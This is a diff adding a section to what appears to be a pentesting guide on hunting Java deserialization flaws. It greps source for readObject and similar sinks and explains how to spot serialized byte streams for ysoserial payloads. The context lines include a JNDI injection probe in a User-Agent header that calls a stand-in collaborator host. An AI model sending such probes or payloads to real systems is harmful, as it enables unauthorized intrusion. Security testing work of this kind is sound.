@@ -39,6 +39,29 @@ curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"
 curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
 ```
 
+### Java sink hunting in source
+
+The reachable sink is `ObjectInputStream.readObject()`. Everything else is a
+gadget choice. Grep for the call sites, then trace back to the request that
+controls the byte stream:
+
+```bash
+# Direct deserialization sinks
+grep -rn "readObject()\|ObjectInputStream\|readUnshared()" --include="*.java" .
+grep -rn "XMLDecoder\|XStream\|fromXML\|SnakeYAML\|Yaml.load" --include="*.java" .
+
+# Frameworks that deserialize for you (no explicit readObject in app code)
+#   - JMX / RMI endpoints
+#   - HttpInvoker / Hessian (Spring remoting)
+#   - T3 / IIOP (WebLogic)
+#   - JSF ViewState (see hunt-aspnet for the .NET twin)
+```
+
+Confirm the wire format before building a payload: `AC ED 00 05` means the
+stream is raw Java serialization and `ysoserial` output can go straight in.
+`rO0AB` is the same bytes base64-encoded, which is what cookies and JSON
+fields usually carry.
+
 ### Header / Cookie Signals
 ```
 Content-Type: application/x-java-serialized-object
